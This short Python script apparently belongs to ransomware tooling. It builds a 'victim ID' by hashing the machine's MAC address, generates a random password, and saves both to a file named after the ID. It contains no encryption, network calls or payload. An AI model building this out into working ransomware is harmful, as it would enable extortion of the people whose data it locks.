import os
import io
import uuid
import hashlib
import binascii


ID_LEN = 8
PASSWORD_LEN = 40


def generate_id() -> str:
    """Get victim ID"""

    # Get MAC-address number
    mac_num = uuid.getnode()

    mac = hex(mac_num).replace('0x', '').upper()
    mac = '-'.join([mac[2 * i : 2 * (i + 1)] for i in range(6)])

    h = hashlib.sha224()
    h.update(mac.encode())
    digest = h.hexdigest()

    return digest[:ID_LEN].upper()


#
# Main
#

# Generate password
password = binascii.hexlify(os.urandom(PASSWORD_LEN)).decode()
print('password:', password)

# Victim ID
victim_id = generate_id()
print('victim id:', victim_id)

with io.open(victim_id + '.txt', 'wt') as f:
    f.write('\n\t' + victim_id + '\n\t' + password)